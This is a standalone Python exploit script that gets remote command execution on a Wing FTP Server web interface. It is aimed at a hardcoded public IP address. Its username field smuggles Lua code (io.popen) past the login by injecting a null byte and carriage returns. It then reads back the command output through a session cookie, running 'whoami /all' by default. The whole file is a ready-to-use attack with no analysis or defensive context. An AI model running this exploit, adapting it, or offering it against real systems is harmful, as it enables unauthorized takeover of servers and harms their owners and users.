#!/usr/bin/env python3
# /// script
# requires-python = ">=3.11"
# dependencies = [
#   "requests",
# ]
# ///

import argparse
import pathlib
import re
import socket
import sys
import urllib.parse

import requests

HERE = pathlib.Path(__file__).resolve().parent
TARGET = "http://23.179.17.68"
SESSION = requests.Session()
SESSION.trust_env = False


def build_payload(command: str) -> str:
    command = command.replace("\\", "\\\\")
    encoded_command = urllib.parse.quote(command, safe="")
    injected = (
        "%00]]%0d"
        f"local+h+%3d+io.popen(%22{encoded_command}%22)%0d"
        "local+r+%3d+h%3aread(%22*a%22)%0d"
        "h%3aclose()%0d"
        "print(r)%0d"
        "--"
    )
    return f"username=anonymous{injected}&password="


def ensure_http_up(host: str, port: int = 80) -> None:
    with socket.create_connection((host, port), timeout=3):
        return


def run_command(command: str) -> str:
    ensure_http_up("23.179.17.68", 80)

    response = SESSION.post(
        f"{TARGET}/loginok.html",
        headers={
            "Cookie": "client_lang=english",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": f"{TARGET}/login.html?lang=english",
            "Origin": TARGET,
        },
        data=build_payload(command),
        timeout=30,
    )
    response.raise_for_status()

    match = re.search(r"UID=([^;]+)", response.headers.get("Set-Cookie", ""))
    if not match:
        raise RuntimeError("missing UID cookie after exploit POST")

    response = SESSION.get(
        f"{TARGET}/dir.html",
        headers={"Cookie": f"UID={match.group(1)}"},
        timeout=30,
    )
    response.raise_for_status()
    return response.text


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-c",
        "--command",
        default=r"whoami /all",
        help="Windows command to run through the Wing FTP web RCE",
    )
    args = parser.parse_args()

    try:
        print(run_command(args.command))
    except ConnectionRefusedError as exc:
        raise SystemExit(
            "80/tcp is currently refusing connections; the Wing FTP web exploit path is unavailable",
        ) from exc


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:
        print(f"error: {exc}", file=sys.stderr)
        raise
